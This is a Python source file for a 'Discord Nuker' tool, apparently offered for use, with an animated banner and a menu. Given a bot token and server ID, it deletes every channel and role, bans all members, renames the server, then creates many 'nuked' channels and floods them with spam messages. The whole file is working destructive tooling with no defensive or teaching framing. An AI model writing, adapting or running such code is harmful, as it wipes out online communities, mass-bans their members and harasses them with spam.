import asyncio
import discord
from discord.ext import commands
from pystyle import Center, Anime, Colors, Colorate, Write, System
from time import sleep
import os

# Force terminal size and clear
os.system('mode con: cols=140 lines=45')
System.Clear()
System.Title("Rev's Discord Nuker")

# First ASCII art - PROPERLY CENTERED
banner = r"""
                                      /$$$$$$  /$$           /$$$$$$$$ /$$                        
                                     /$$__  $$|__/          | $$_____/| $$                        
                                    | $$  \ $$ /$$  /$$$$$$ | $$      | $$  /$$$$$$  /$$  /$$  /$$
                                    | $$$$$$$$| $$ /$$__  $$| $$$$$   | $$ /$$__  $$| $$ | $$ | $$  
                                    | $$__  $$| $$| $$  \__/| $$__/   | $$| $$  \ $$| $$ | $$ | $$  
                                    | $$  | $$| $$| $$      | $$      | $$| $$  | $$| $$ | $$ | $$  
                                    | $$  | $$| $$| $$      | $$      | $$|  $$$$$$/|  $$$$$/$$$$/  
                                    |__/  |__/|__/|__/      |__/      |__/ \______/  \_____/\___/   
"""

# Display centered animated banner
Anime.Fade(banner, Colors.red_to_yellow, Colorate.Vertical, enter=True)
sleep(2)  # Show banner for 2 seconds
System.Clear()

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.bans = True
intents.messages = True

bot = commands.Bot(command_prefix='!', intents=intents)

async def nuke_channels(guild):
    for channel in guild.channels:
        try:
            await channel.delete()
            Write.Print(f"Deleted channel: {channel.name}\n", Colors.red_to_yellow, interval=0.001)
        except Exception as e:
            Write.Print(f"Failed to delete channel {channel.name}: {e}\n", Colors.red_to_yellow, interval=0.001)

async def nuke_roles(guild):
    for role in guild.roles:
        if role != guild.me.top_role and not role.is_default():
            try:
                await role.delete()
                Write.Print(f"Deleted role: {role.name}\n", Colors.red_to_yellow, interval=0.001)
            except Exception as e:
                Write.Print(f"Failed to delete role {role.name}: {e}\n", Colors.red_to_yellow, interval=0.001)

async def nuke_members(guild):
    async for member in guild.fetch_members(limit=None):
        if member != guild.me:
            try:
                await member.ban(reason="Nuked by Rev")
                Write.Print(f"Banned user: {member.name}\n", Colors.red_to_yellow, interval=0.001)
            except Exception as e:
                Write.Print(f"Failed to ban {member.name}: {e}\n", Colors.red_to_yellow, interval=0.001)

async def nuke_everything(guild, new_name, channels_to_create, spam_message):
    try:
        await guild.edit(name=new_name)
        Write.Print(f"Server renamed to: {new_name}\n", Colors.red_to_yellow, interval=0.001)
    except Exception as e:
        Write.Print(f"Failed to rename server: {e}\n", Colors.red_to_yellow, interval=0.001)

    # Ban members concurrently
    ban_tasks = []
    async for member in guild.fetch_members(limit=None):
        if member != guild.me:
            ban_tasks.append(asyncio.create_task(
                member.ban(reason="Nuked by Rev")
            ))
    for task in ban_tasks:
        try:
            await task
            Write.Print(f"Banned user\n", Colors.red_to_yellow, interval=0.001)
        except Exception as e:
            Write.Print(f"Failed to ban user: {e}\n", Colors.red_to_yellow, interval=0.001)

    # Delete channels concurrently
    delete_channel_tasks = [asyncio.create_task(channel.delete()) for channel in guild.channels]
    for task in delete_channel_tasks:
        try:
            await task
            Write.Print(f"Deleted a channel\n", Colors.red_to_yellow, interval=0.001)
        except Exception as e:
            Write.Print(f"Failed to delete a channel: {e}\n", Colors.red_to_yellow, interval=0.001)

    # Delete roles concurrently (except top/default)
    delete_role_tasks = []
    for role in guild.roles:
        if role != guild.me.top_role and not role.is_default():
            delete_role_tasks.append(asyncio.create_task(role.delete()))
    for task in delete_role_tasks:
        try:
            await task
            Write.Print(f"Deleted a role\n", Colors.red_to_yellow, interval=0.001)
        except Exception as e:
            Write.Print(f"Failed to delete a role: {e}\n", Colors.red_to_yellow, interval=0.001)

    # Create channels concurrently
    create_tasks = []
    created_channels = []
    for i in range(channels_to_create):
        create_tasks.append(asyncio.create_task(guild.create_text_channel(f"nuked-{i+1}")))
    for task in create_tasks:
        try:
            channel = await task
            created_channels.append(channel)
            Write.Print(f"Created channel: {channel.name}\n", Colors.red_to_yellow, interval=0.001)
        except Exception as e:
            Write.Print(f"Failed to create channel: {e}\n", Colors.red_to_yellow, interval=0.001)

    # Spam messages concurrently per channel
    spam_tasks = []
    for channel in created_channels:
        spam_tasks.append(asyncio.create_task(spam_in_channel(channel, spam_message)))

    await asyncio.gather(*spam_tasks)

async def spam_in_channel(channel, message):
    try:
        for _ in range(10):
            await channel.send(message)
            await asyncio.sleep(0.2)
        Write.Print(f"Sent spam messages to {channel.name}\n", Colors.red_to_yellow, interval=0.001)
    except Exception as e:
        Write.Print(f"Failed to spam in {channel.name}: {e}\n", Colors.red_to_yellow, interval=0.001)

async def main():
    System.Clear()

    ascii_art = r"""
 /$$   /$$           /$$                          
| $$$ | $$          | $$                          
| $$$$| $$ /$$   /$$| $$   /$$  /$$$$$$   /$$$$$$ 
| $$ $$ $$| $$  | $$| $$  /$$/ /$$__  $$ /$$__  $$
| $$  $$$$| $$  | $$| $$$$$$/ | $$$$$$$$| $$  \__/
| $$\  $$$| $$  | $$| $$_  $$ | $$_____/| $$      
| $$ \  $$|  $$$$$$/| $$ \  $$|  $$$$$$$| $$      
|__/  \__/ \______/ |__/  \__/ \_______/|__/      
"""
    print("\n" * 2)
    Write.Print(ascii_art, Colors.red_to_yellow, interval=0.0025)
    print("\n" * 2)

    Write.Print("════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════\n", Colors.red_to_yellow, interval=0.000)
    Write.Print(
        "[1] Delete all channels     | [2] Delete all roles       | [3] Ban all members    | [4] Nuke everything\n"
        "[5] Exit\n",
        Colors.red_to_yellow, interval=0.005
    )
    Write.Print("════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════\n", Colors.red_to_yellow, interval=0.000)
    choice = Write.Input("[>] Choice?: ", Colors.red_to_yellow, interval=0.005)

    token = Write.Input("Enter bot token -> ", Colors.red_to_yellow, interval=0.005)
    guild_id = Write.Input("Enter guild ID -> ", Colors.red_to_yellow, interval=0.005)

    try:
        guild_id = int(guild_id)
    except ValueError:
        Write.Print("Invalid guild ID!\n", Colors.red_to_yellow, interval=0.01)
        sleep(1)
        return

    @bot.event
    async def on_ready():
        guild = bot.get_guild(guild_id)
        if not guild:
            Write.Print("Guild not found or bot lacks access!\n", Colors.red_to_yellow, interval=0.01)
            await bot.close()
            return

        if choice == "1":
            await nuke_channels(guild)

        elif choice == "2":
            await nuke_roles(guild)

        elif choice == "3":
            await nuke_members(guild)

        elif choice == "4":
            try:
                channels_to_create_str = Write.Input("How many channels to create? -> ", Colors.red_to_yellow, interval=0.005)
                channels_to_create = int(channels_to_create_str)
            except ValueError:
                Write.Print("Invalid number of channels!\n", Colors.red_to_yellow, interval=0.01)
                await bot.close()
                return

            new_name = Write.Input("Enter the new server name -> ", Colors.red_to_yellow, interval=0.005)
            spam_message = Write.Input("Enter spam message -> ", Colors.red_to_yellow, interval=0.005)

            await nuke_everything(guild, new_name, channels_to_create, spam_message)

        elif choice == "5":
            Write.Print("Exiting...\n", Colors.red_to_yellow, interval=0.01)
            await bot.close()
            return
        else:
            Write.Print("Invalid option!\n", Colors.red_to_yellow, interval=0.01)
            await bot.close()
            return

        Write.Input("Press Enter to exit...", Colors.red_to_yellow, interval=0.005)
        await bot.close()

    try:
        await bot.start(token)
    except discord.errors.LoginFailure:
        Write.Print("Invalid bot token!\n", Colors.red_to_yellow, interval=0.01)
        sleep(1)
    except Exception as e:
        Write.Print(f"Failed to connect: {str(e)}\n", Colors.red_to_yellow, interval=0.01)
        sleep(1)

if __name__ == "__main__":
    asyncio.run(main())
